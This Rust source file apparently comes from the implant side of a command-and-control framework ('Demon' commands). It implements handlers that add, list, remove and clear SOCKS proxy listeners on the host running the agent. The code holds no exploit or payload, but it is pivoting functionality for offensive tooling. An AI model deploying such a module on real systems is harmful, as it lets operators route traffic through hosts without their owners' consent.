use std::net::{Ipv4Addr, SocketAddrV4, TcpListener};

use red_cell_common::demon::DemonSocketCommand;
use tracing::{info, warn};

use super::super::super::socket_io::{
    encode_socks_proxy_add, encode_socks_proxy_clear, encode_socks_proxy_remove, encode_u32,
    parse_u32_le,
};
use super::super::super::types::SocksProxy;
use super::super::{SocketError, SocketState};

impl SocketState {
    pub(in super::super) fn handle_socks_proxy_add(
        &mut self,
        request_id: u32,
        rest: &[u8],
    ) -> Result<(), SocketError> {
        let mut offset = 0;
        let bind_addr = parse_u32_le(rest, &mut offset)?;
        let bind_port = parse_u32_le(rest, &mut offset)?;

        let listener_id = self.allocate_socket_id();
        let bind_socket = SocketAddrV4::new(Ipv4Addr::from(bind_addr), bind_port as u16);

        match TcpListener::bind(bind_socket) {
            Ok(listener) => {
                if let Err(e) = listener.set_nonblocking(true) {
                    warn!(error = %e, "failed to set socks listener non-blocking");
                    self.queue_response(
                        request_id,
                        encode_socks_proxy_add(false, 0, bind_addr, bind_port),
                    );
                    return Ok(());
                }
                let bound_port =
                    listener.local_addr().map(|addr| u32::from(addr.port())).unwrap_or(bind_port);
                info!(listener_id, bind_addr, bound_port, "socks proxy added");
                self.socks_proxies
                    .insert(listener_id, SocksProxy { listener, bind_addr, bind_port: bound_port });
                self.queue_response(
                    request_id,
                    encode_socks_proxy_add(true, listener_id, bind_addr, bound_port),
                );
            }
            Err(e) => {
                warn!(error = %e, "failed to bind socks proxy");
                self.queue_response(
                    request_id,
                    encode_socks_proxy_add(false, 0, bind_addr, bind_port),
                );
            }
        }

        Ok(())
    }

    pub(in super::super) fn handle_socks_proxy_list(&mut self, request_id: u32) {
        let mut payload = encode_u32(u32::from(DemonSocketCommand::SocksProxyList));
        for (socket_id, proxy) in &self.socks_proxies {
            payload.extend_from_slice(&encode_u32(*socket_id));
            payload.extend_from_slice(&encode_u32(proxy.bind_addr));
            payload.extend_from_slice(&encode_u32(proxy.bind_port));
        }
        self.queue_response(request_id, payload);
    }

    pub(in super::super) fn handle_socks_proxy_remove(
        &mut self,
        request_id: u32,
        rest: &[u8],
    ) -> Result<(), SocketError> {
        let mut offset = 0;
        let socket_id = parse_u32_le(rest, &mut offset)?;
        if self.socks_proxies.remove(&socket_id).is_some() {
            let client_ids: Vec<u32> = self
                .socks_clients
                .iter()
                .filter_map(|(id, c)| (c.server_id == socket_id).then_some(*id))
                .collect();
            for client_id in client_ids {
                self.socks_clients.remove(&client_id);
            }
            self.queue_response(request_id, encode_socks_proxy_remove(socket_id));
        }
        Ok(())
    }

    pub(in super::super) fn handle_socks_proxy_clear(&mut self, request_id: u32) {
        self.socks_proxies.clear();
        self.socks_clients.clear();
        self.queue_response(request_id, encode_socks_proxy_clear(true));
    }
}
